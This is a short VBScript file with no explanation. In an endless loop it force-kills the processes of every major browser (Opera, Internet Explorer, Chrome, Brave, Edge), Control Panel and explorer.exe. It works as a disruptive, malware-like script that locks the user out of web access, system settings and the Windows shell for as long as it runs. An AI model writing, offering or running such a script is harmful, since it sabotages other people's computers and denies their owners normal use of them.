Do
Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.Run "taskkill /f /im opera.exe", , True
oShell.Run "taskkill /f /im iexplore.exe", , True
oShell.Run "taskkill /f /im chrome.exe", , True
oShell.Run "taskkill /f /im brave.exe", , True
oShell.Run "taskkill /f /im msedge.exe", , True
oShell.Run "taskkill /f /im control.exe", , True
oShell.Run "taskkill /f /im explorer.exe", , True
Loop